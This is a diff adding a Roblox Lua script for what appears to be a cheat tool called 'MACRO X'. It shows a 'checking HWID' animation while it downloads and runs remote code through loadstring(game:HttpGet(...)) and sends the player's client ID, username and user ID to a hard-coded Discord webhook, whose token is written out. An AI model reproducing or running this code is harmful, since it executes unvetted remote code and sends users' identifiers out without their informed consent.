@@ -1,0 +1,118 @@
+
+
+local ScreenGui = Instance.new("ScreenGui")
+local Script = Instance.new("Frame")
+local HWDI = Instance.new("TextLabel")
+local MACROX = Instance.new("TextLabel")
+
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Script.Name = "Script"
+Script.Parent = ScreenGui
+Script.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Script.Position = UDim2.new(0.334502935, 0, 0.40157479, 0)
+Script.Size = UDim2.new(0, 277, 0, 100)
+
+HWDI.Name = "HWDI"
+HWDI.Parent = Script
+HWDI.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+HWDI.BackgroundTransparency = 1.000
+HWDI.Position = UDim2.new(0.122743681, 0, 0.25, 0)
+HWDI.Size = UDim2.new(0, 207, 0, 50)
+HWDI.Font = Enum.Font.FredokaOne
+HWDI.Text = "CHECANDO HWDI..."
+HWDI.TextColor3 = Color3.fromRGB(255, 255, 255)
+HWDI.TextSize = 22.000
+
+MACROX.Name = "MACRO X"
+MACROX.Parent = Script
+MACROX.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+MACROX.BackgroundTransparency = 1.000
+MACROX.Position = UDim2.new(0.725631773, 0, 0, 0)
+MACROX.Size = UDim2.new(0, 76, 0, 19)
+MACROX.Font = Enum.Font.FredokaOne
+MACROX.Text = "MACRO X"
+MACROX.TextColor3 = Color3.fromRGB(255, 255, 255)
+MACROX.TextSize = 11.000
+
+-- Scripts:
+
+local function QGAB_fake_script() -- HWDI.Animação 
+	local script = Instance.new('Script', HWDI)
+	
+	function change(text)
+		for i = 1,#text do 
+			script.Parent.Text = string.sub(text, 1, i)
+			wait(0.8)
+		end
+	end
+	
+	change("Checando HWID...")
+	local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+	
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/webhooking2022/functions-library/main/.functions", true))()
+	repeat wait() until functions 
+	
+	functions.sendWebHook(
+		{
+		    username = "MACRO X",
+		    avatar_url = "https://media.discordapp.net/attachments/999881797066293359/1023768526152020028/standard_7.gif",
+		    
+		    embeds = {
+		        {
+		            title = "**Nova HWID!**",
+		            description = string.format("**%s**", hwid),
+		            color = tonumber(0xffffff),
+		            inline = true,
+		            url="https://github.com/MXJailbreak/Byjapa/edit/main/HWDI"
+		        },
+		        {
+		            title = "**Informações:**",
+		            description = string.format("**%s / %s**", game.Players.LocalPlayer.Name, game.Players.LocalPlayer.UserId),
+		            color = tonumber(0xffffff),
+		            inline = true,
+		        },
+		        
+		        
+		    }
+		},
+		"https://discord.com/api/webhooks/1056782671579205714/NVrA69mtoIrtef3NPiNOltxRC4zp8yIPa6HAycK8e3hHgvhHU2dKzksETIgXXtSWaXFC"
+	)
+	
+	change("HWID CHECADA!")
+	wait(3)
+	script.Parent.Parent.Parent:Destroy()
+end
+coroutine.wrap(QGAB_fake_script)()
+local function AJUQR_fake_script() -- MACROX.Animação 3 
+	local script = Instance.new('Script', MACROX)
+
+	local Texto = "MACRO X"
+	local TextLabel = script.Parent.Parent["MACRO X"]
+	
+	spawn(function()
+		while true do
+			for i = 1,#Texto do
+				TextLabel.Text = string.sub(Texto, 1, i)
+				wait(0.2)
+			end
+			wait(1)
+		end
+	end)
+end
+coroutine.wrap(AJUQR_fake_script)()
+local function YDZOXL_fake_script() -- Script.RGB 
+	local script = Instance.new('LocalScript', Script)
+
+	local Menu = script.Parent
+	function get() return math.random(0,255) end
+	task.spawn(function()
+		while true do
+			Menu.BorderColor3 = Color3.fromRGB(get(), get(), get())
+			wait(0.5)
+		end
+	end)
+end
+coroutine.wrap(YDZOXL_fake_script)()
